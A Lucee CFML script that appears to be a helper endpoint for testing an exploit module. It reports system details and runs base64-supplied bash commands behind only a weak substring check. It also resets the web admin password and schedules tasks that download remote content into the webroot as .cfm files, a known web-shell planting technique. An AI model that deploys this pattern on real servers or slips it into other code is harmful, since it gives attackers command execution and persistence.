<cfsetting showdebugoutput="false">
<cfcontent type="application/json; charset=utf-8" reset="true">
<cfscript>
mode = structKeyExists(form, "mode") ? form.mode : (structKeyExists(url, "mode") ? url.mode : "verify");
result = structNew("ordered");
result["version"] = server.lucee.version;
if (mode == "verify") {
    result["java"] = createObject("java", "java.lang.System").getProperty("java.version");
    result["user"] = createObject("java", "java.lang.System").getProperty("user.name");
    result["webroot"] = expandPath("/");
    result["context"] = expandPath("/lucee/");
    result["temp"] = expandPath("{temp-directory}");
    cfschedule(action="list", result="tasks");
    result["jobs"] = [];
    for (row in tasks) {
        arrayAppend(result["jobs"], row.task);
    }
} else if (mode == "execute") {
    command = charsetEncode(binaryDecode(form.command_base64, "base64"), "UTF-8");
    if (!find("/tmp/module-target-lucee-", command)) {
        throw(message="Expected a controlled proof command");
    }
    output = "";
    errors = "";
    cfexecute(name="/bin/bash", arguments=["-c", command], timeout=5, variable="output", errorVariable="errors");
    // Some 5.3.7 executions remove an empty output variable. Physical file
    // proofs and exact nonempty output are checked independently by the caller.
    result["output_base64"] = toBase64(charsetDecode(structKeyExists(variables, "output") ? output : "", "UTF-8"));
    result["errors_base64"] = toBase64(charsetDecode(structKeyExists(variables, "errors") ? errors : "", "UTF-8"));
} else if (mode == "configure") {
    cfadmin(action="updatePassword", type="web", oldPassword="", newPassword=form.password);
    result["configured"] = true;
} else if (mode == "schedule" || mode == "delete") {
    if (!reFind("^(module_target_lucee_[a-z0-9_]+|[A-Za-z0-9]{8,16})$", form.task)) {
        throw(message="Expected a controlled task name");
    }
    if (mode == "schedule") {
        cfschedule(action="update", task=form.task, operation="HTTPRequest", url=form.source, startDate=now(), startTime=now(), interval="3600", publish=true, path=expandPath("/"), file=form.task & ".cfm", requestTimeout=10);
        cfschedule(action="run", task=form.task);
    } else {
        cfschedule(action="delete", task=form.task);
    }
    result["task"] = form.task;
} else if (mode != "health") {
    throw(message="Unsupported native operation");
}
writeOutput(serializeJSON(result));
</cfscript>
